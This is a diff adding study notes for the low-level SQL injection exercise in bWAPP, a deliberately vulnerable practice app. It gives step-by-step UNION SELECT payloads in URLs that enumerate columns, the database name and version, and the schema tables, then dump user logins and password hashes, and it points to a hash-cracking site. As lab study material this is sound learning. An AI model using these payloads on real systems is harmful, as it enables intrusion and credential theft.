@@ -1,1 +1,39 @@
+-----bWAPP-----
 
+
+
+
+---SQL-Injection (low)---
+
+> search avatar   | output: no movies were found!
+> search iron man | output: movie data table 
+> search 1'       | output: error (SQL Injection Based on 1=1 is Always True. The original purpose of the code was to create an SQL statement to select a user, with a given user id.)
+> we got an error in sql syntax, let's try some sql commands
+> now, edit the URL (https://bwapp.hakhub.net/sqli_1.php?title=1'&action=search) to (https://bwapp.hakhub.net/sqli_1.php?title=1' order by 1-- -)
+> keep on trying by replacing 1 with other numbers until you recieve an error like:
+> Error: Unknown column '8' in 'order clause' (for: https://bwapp.hakhub.net/sqli_1.php?title=1' order by 8-- -)(The ORDER BY keyword is used to sort the result-set in ascending or descending order)
+> the above error appeared cause we are out of table
+> in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,5,6,7-- - (The UNION operator is used to combine the result-set of two or more SELECT statements.)
+> output: we got the select id's of each column (not sure)
+> in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,database(),6,7-- - (A database in SQL Server is made up of a collection of tables that stores a specific set of structured data.)
+> output: bWAPP (we got the database name)
+> in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,version(),6,7-- -  (The MySQL Version() function returns the version of the MySQL database as a string.)
+> output: 5.5.47-0ubuntu0.14.04.1 (we got the database version)
+> in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,table_name,6,7 from information_schema.tables-- - (The TABLE_NAME function searches for an object and returns the unqualified name of the object after any alias chains have been resolved.)(INFORMATION_SCHEMA provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column, or access privileges.)
+> output: database metadata of table names
+> in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,table_name,6,7 from information_schema.tables where table_schema=database()-- - (TABLE_SCHEMA, Name of schema that contains the table.)
+> output: names of the tables
+> in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,group_concat(table_name),6,7 from information_schema.tables where table_schema=database()-- - (The GROUP_CONCAT() function in MySQL is used to concatenate data from multiple rows into one field.)
+> output: grouped table names in single field
+> in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,group_concat(column_name),6,7 from information_schema.columns where table_name="users"-- -
+> output: column names of users table
+> in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,group_concat(login,password),6,7 from users-- -
+> output: login name and their password
+> in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,group_concat(login,0x3a,password),6,7 from users-- -
+> output: login name and password separated with :
+> copy the hash password and decrypt it using https://hashes.com/en/decrypt/hash
+
+
+
+
+---
